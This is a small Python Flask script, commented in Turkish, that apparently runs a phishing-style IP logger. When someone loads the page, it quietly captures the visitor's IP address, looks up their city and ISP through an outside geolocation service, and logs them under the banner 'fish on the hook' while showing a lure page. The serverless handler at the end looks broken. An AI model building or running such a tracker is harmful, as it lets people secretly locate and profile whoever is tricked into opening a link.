from flask import Flask, render_template, request
import requests

app = Flask(__name__, template_folder='../templates')

@app.route('/')
def index():
    # IP Yakalama
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # OSINT
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}").json()
        city = data.get('city', '?')
        isp = data.get('isp', '?')
        print(f"\n[!!!] BALIK OLTADA: {ip} | {city} | {isp}\n")
    except:
        print(f"\n[!!!] YENI IP: {ip}\n")

    return render_template('index.html')

def handler(event, context):
    return app(event, context)
    
